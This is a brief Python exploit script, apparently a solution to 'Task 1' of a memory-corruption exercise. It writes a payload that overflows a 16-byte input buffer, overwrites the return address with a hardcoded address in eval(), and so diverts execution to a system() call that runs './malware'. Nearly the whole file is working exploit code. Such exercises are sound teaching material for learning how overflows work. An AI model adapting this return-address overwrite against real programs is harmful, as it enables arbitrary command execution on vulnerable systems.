#!/usr/bin/env python3
"""Task 1: return from input() into the command-execution path in eval()."""

import struct
import sys


def qword(value: int) -> bytes:
    return struct.pack("<Q", value)


# input() has a 16-byte local buffer.  The command lives in the global
# command_buf; return to eval()+0x94, where EDI is set to command_buf
# immediately before system() is called.
payload = (
    b"./malware\x00"
    + b"A" * 6
    + b"B" * 8
    + qword(0x401A6B)
    + b"\n"
)

sys.stdout.buffer.write(payload)
